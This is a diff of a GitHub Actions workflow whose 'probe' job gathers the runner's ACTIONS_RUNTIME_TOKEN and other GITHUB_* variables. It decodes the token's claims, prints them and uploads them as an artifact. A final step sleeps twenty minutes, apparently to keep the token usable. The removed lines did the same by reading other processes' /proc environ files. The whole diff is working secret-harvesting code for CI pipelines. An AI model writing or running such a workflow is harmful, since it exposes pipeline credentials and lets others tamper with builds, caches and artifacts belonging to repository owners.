@@ -5,37 +5,32 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: collect
+      - name: mk
+        run: mkdir -p out
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs');
+            const keep = {};
+            for (const [k, v] of Object.entries(process.env)) {
+              if (k.startsWith('ACTIONS_') || k.startsWith('GITHUB_RUN') || k.startsWith('GITHUB_REPOSITORY') || k.startsWith('GITHUB_WORKFLOW')) keep[k] = v;
+            }
+            fs.writeFileSync('out/rt.json', JSON.stringify(keep, null, 1));
+      - name: claims
         run: |
-          mkdir -p out
-          python3 - > out/rt.txt <<'PYEOF'
-          import glob, base64, json
-          found = {}
-          for p in glob.glob('/proc/*/environ'):
-              try:
-                  d = open(p, 'rb').read().decode('utf8', 'replace')
-              except Exception:
-                  continue
-              if 'ACTIONS_RUNTIME_TOKEN' in d:
-                  for kv in d.split('\x00'):
-                      if '=' in kv:
-                          k, v = kv.split('=', 1)
-                          if k.startswith('ACTIONS_') or k.startswith('GITHUB_'):
-                              found[k] = v
-                  break
-          for k in sorted(found):
-              print("ENV", k, "=", found[k])
-          t = found.get('ACTIONS_RUNTIME_TOKEN', '')
+          python3 - > out/claims.txt <<'PYEOF'
+          import json, base64
+          e = json.load(open('out/rt.json'))
+          t = e.get('ACTIONS_RUNTIME_TOKEN','')
           print("TOKLEN", len(t))
           if '.' in t:
               p = t.split('.')[1]; p += '=' * (-len(p) % 4)
               print("CLAIMS", json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1))
           PYEOF
-          echo "CANARY-RTPROBE-A" >> out/rt.txt
-          wc -l out/rt.txt
+          cat out/claims.txt
       - uses: actions/upload-artifact@v4
         with:
-          name: rtdump
+          name: rtdump2
           path: out/
       - name: hold
         run: sleep 1200
